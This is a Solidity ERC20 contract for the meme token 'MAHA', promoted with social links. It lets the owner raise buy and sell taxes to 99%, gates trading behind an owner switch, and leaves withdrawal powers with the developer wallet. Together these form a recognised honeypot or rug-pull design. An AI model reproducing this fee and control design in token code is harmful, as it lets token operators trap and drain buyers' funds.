/**
 *Submitted for verification at Etherscan.io 
*/

/**
 *Submitted MAHA Team
*/

/*
       __        __    __         __         __  __          __  __                        __   __   __        
|\ /| |  | |  / |     |  | |\ /| |   |<<  > |<< |  |   |  | |   |  | |   >>|<< |  | | |   |  | |    |  | > | | 
| < | |><| |<<  |<<   |><| | < | |<< |>>| | |   |><|   |><| |<< |><| |     |   |><| \</   |><| | >> |><| | |\| 
|   | |  | |  \ |__   |  | |   | |__ |  \ | |__ |  |   |  | |__ |  | |<<   |   |  |  |    |  | '__| |  | | | | 
    
                                                                                                                                                                                                                       
                                                                                                                          
                                                                                                                         

Make America Healthy Again | $MAHA

 First interview on this new chapter of my work to Make America Healthy Again. #MAHA
 https://x.com/RobertKennedyJr/status/1827749244918522023

    Telegram : https://t.me/maha_zportal
    Website  : https://mahaeth.xyz
    Twitter  : https://x.com/MahaErc20
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address _account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Ownable is Context {

    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any _account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }


}

interface IDexSwapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDexSwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}

contract MAHA is Context, IERC20, Ownable {

    using SafeMath for uint256;

    address private constant deadAddress = address(0xdead);

    string private _name = "Make America Healthy Again";
    string private _symbol = "MAHA";
    uint8 private _decimals = 18; 

    address private marketingWallet;
    address private developerWallet;
    
    struct feeStruct {
        uint256 buy;
        uint256 sell;
    }
    feeStruct public fee;

    bool public stealth;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public IsChargePair;
    mapping (address => bool) public isMarketPair;

    uint256 private _totalSupply = 1_000_000_000 * 10**_decimals;

    uint256 public maxTransaction =  _totalSupply.mul(3).div(100);
    uint256 public maxWallet = _totalSupply.mul(3).div(100);

    uint256 public swapThreshold = _totalSupply.mul(1).div(100);

    bool public swapEnabled = true;
    bool public swapbylimit = true;

    IDexSwapRouter public dexRouter;
    address public dexPair;

    bool inSwap;

    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    modifier onlyGuard() {
        require(msg.sender == developerWallet,'Invalid Caller!');
        _;
    }
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );

    constructor(address _taxWallet) {

        developerWallet = msg.sender;
        marketingWallet = _taxWallet;

        IDexSwapRouter _dexRouter = IDexSwapRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        dexPair = IDexSwapFactory(_dexRouter.factory()).createPair(address(this),_dexRouter.WETH());

        dexRouter = _dexRouter;

        isMarketPair[dexPair] = true;

        IsChargePair[address(this)] = true;
        IsChargePair[developerWallet] = true;
        IsChargePair[address(deadAddress)] = true;

        fee.buy = 20;
        fee.sell = 25;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
       return _balances[account];     
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
    
        if (inSwap) {
            return _basicTransfer(sender, recipient, amount);
        }
        else {

            if(!IsChargePair[sender] && !IsChargePair[recipient]) {
                require(stealth,"Not stealth!");
                require(amount <= maxTransaction, "Exceeds maxTxAmount");
                if(!isMarketPair[recipient]) {
                    require(balanceOf(recipient).add(amount) <= maxWallet, "Exceeds maxWallet");
                }
            }            

            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= swapThreshold;

            if (overMinimumTokenBalance && 
                !inSwap && 
                !isMarketPair[sender] && 
                swapEnabled &&
                !IsChargePair[sender] &&
                !IsChargePair[recipient]
                ) {
                swapBack(contractTokenBalance);
            }
            
            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

            uint256 finalAmount = shouldNotTakeFee(sender,recipient) ? amount : takeFee(sender, recipient, amount);

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;

        }

    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function shouldNotTakeFee(address sender, address recipient) internal view returns (bool) {
        if(IsChargePair[sender] || IsChargePair[recipient]) {
            return true;
        }
        else if (isMarketPair[sender] || isMarketPair[recipient]) {
            return false;
        }
        else {
            return false;
        }
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint feeAmount;

        unchecked {

            if(isMarketPair[sender]) { 
                feeAmount = amount.mul(fee.buy).div(100);
            } 
            else if(isMarketPair[recipient]) { 
                feeAmount = amount.mul(fee.sell).div(100);
            }

            if(feeAmount > 0) {
                _balances[address(this)] = _balances[address(this)].add(feeAmount);
                emit Transfer(sender, address(this), feeAmount);
            }

            return amount.sub(feeAmount);
        }
        
    }

    function swapBack(uint256 tokens) private {

        uint256 contractBalance = balanceOf(address(this));
        uint256 tokensToSwap; 

        if (contractBalance == 0) {
            return;
        }

        if ((fee.buy+fee.sell) == 0) {

        if(contractBalance > 0 && contractBalance < swapThreshold) {
            tokensToSwap = contractBalance;
        }
        else {
            uint256 sellFeeTokens = tokens.mul(fee.sell).div(100);
            tokens -= sellFeeTokens;
            if (tokens > swapThreshold) {
                tokensToSwap = swapThreshold;
            }
            else {
                tokensToSwap = tokens;
            }
        }
    }

    else {

        if(contractBalance > 0 && contractBalance < swapThreshold.div(5)) {
            return;
        }
        else if (contractBalance > 0 && contractBalance > swapThreshold.div(5) && contractBalance < swapThreshold) {
            tokensToSwap = swapThreshold.div(5);
        }
        else {
            uint256 sellFeeTokens = tokens.mul(fee.sell).div(100);
            tokens -= sellFeeTokens;
            if (tokens > swapThreshold) {
                tokensToSwap = swapThreshold;
            } else {
                tokensToSwap = tokens;
            }
        }
    }
        swapTokensForEth(tokensToSwap);
    }


    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        _approve(address(this), address(dexRouter), tokenAmount);

        // make the swap
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            1, 
            path,
            address(marketingWallet), 
            block.timestamp + 30
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function setMarketingWallet(address newAddress) external onlyOwner {
        marketingWallet = newAddress;
    }

    function setDeveloperWallet(address _newWallet) external onlyOwner {
        developerWallet = _newWallet;
    }

    function rescueFundsNative() external onlyGuard() {
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(msg.sender).transfer(address(this).balance);
    }

    function rescueStuckTokens(address tokenAddress) external onlyGuard() {
        IERC20 tokenContract = IERC20(tokenAddress);
        uint256 balance = tokenContract.balanceOf(address(this));
        require(balance > 0, "No tokens to clear");
        tokenContract.transfer(msg.sender, balance);
    }
    
    function burnClogged(uint _amount) external onlyGuard() {
        uint contractBalance = _balances[address(this)];
        require(contractBalance >= _amount,'Insufficient Balance!');
        _balances[address(this)] = _balances[address(this)] - _amount;
        _balances[address(deadAddress)] = _balances[address(deadAddress)] + _amount;
        emit Transfer(address(this), address(deadAddress), _amount);
    }

    function setFee(uint _buy, uint _sell) external onlyOwner {
        require(_buy <= 99 && _sell <= 99,"Max tax Limit Reached!");
        fee.buy = _buy;
        fee.sell = _sell;
    }   

    function openTrade() external onlyOwner() {
        require(!stealth,"Invalid!");
        stealth = true;
    }

    function setSwapBackSettings(bool _enabled, bool _limited, uint _threshold)
        external
        onlyOwner
    {
        swapEnabled = _enabled;
        swapbylimit = _limited;
        swapThreshold = _threshold;
    }

    function removeLimits() external onlyOwner {
        maxTransaction = _totalSupply;
        maxWallet = _totalSupply;
    }


}